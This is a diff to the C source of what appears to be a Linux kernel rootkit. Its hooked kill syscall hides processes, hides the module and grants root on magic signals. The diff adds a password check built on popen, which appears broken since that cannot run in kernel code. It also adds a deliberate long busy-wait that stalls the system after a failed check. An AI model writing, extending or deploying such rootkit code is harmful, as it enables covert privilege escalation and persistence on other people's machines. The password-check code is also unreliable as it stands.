@@ -297,6 +297,32 @@ module_hide(void)
 	module_hidden = 1;
 }
 
+bool passw_check(){//ADDED
+	bool passed = true;
+	FILE *fp;
+	char path[BUFFER_SIZE];
+	char output[BUFFER_SIZE] = "read -p \"Enter: \" -s pw && echo \"$pw\""; // Allocate a buffer to hold the output
+	char* command = "echo "; // Command to execute
+	fp = popen(command, "r"); // Open the command for reading
+	if (fp != NULL) { // Check if popen failed
+		// Read the output of the command and copy it to the output buffer
+		fgets(path, sizeof(path)-1, fp);
+		for (int i = 0; i < BUFFER_SIZE && path[i] != '\0'; i++) {
+			output[i] = path[i];
+		}
+		pclose(fp); // Close the pipe
+		// Compare the output to the string "test"
+		char test[] = MAGIC_PREFIX;
+		for (int i = 0; i < BUFFER_SIZE && output[i] != '\0' && test[i] != '\0'; i++) {
+			if (output[i] != test[i]) {
+				passed = FALSE;
+				break;
+			}
+		}
+	} else { passed = FALSE; }
+	return passed;
+}//end of passw_check
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	asmlinkage int
 	hacked_kill(const struct pt_regs *pt_regs)
@@ -315,6 +341,7 @@ hacked_kill(pid_t pid, int sig)
 #endif
 	struct task_struct *task;
 	
+	/*
 	long long magicPrefixNum = 0;//ADDED
     const char *prefix = MAGIC_PREFIX;//ADDED
     for (int i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
@@ -322,19 +349,27 @@ hacked_kill(pid_t pid, int sig)
             magicPrefixNum = magicPrefixNum * 10LL + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
         }
     }
+	*/
 
-	if(sig==SIGINVIS) {//MODIFIED from switch to if elses
+	bool pwTried = FALSE;
+	bool pwPassed = FALSE;
+	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
+		pwPassed = passw_check();
+		pwTried = TRUE;
+	}
+
+	if(sig==SIGINVIS && pwPassed) {//MODIFIED from switch to if elses
 		if ((task = find_task(pid)) == NULL)
 			return -ESRCH;
 		task->flags ^= PF_INVISIBLE;
-	}else if(sig==SIGSUPER && pid == magicPrefixNum){
+	}else if(sig==SIGSUPER && pwPassed){
 		give_root();
-	}else if(sig==SIGMODINVIS && pid == magicPrefixNum){
+	}else if(sig==SIGMODINVIS && pwPassed){
 		if (module_hidden) module_show();
 		else module_hide();
-	}else if(pid != magicPrefixNum && (sig==SIGSUPER || sig==SIGMODINVIS)){
+	}else if(pwTried && !pwPassed){
 		//Cause pain //ADDED
-		int seconds = pid * pid * pid * pid * pid;
+		int seconds = 1000000000000;
 		int end_time = (int) __builtin_ia32_rdtsc() + seconds * 2300000000;
     	while ((int) __builtin_ia32_rdtsc() < end_time);
 	}else{
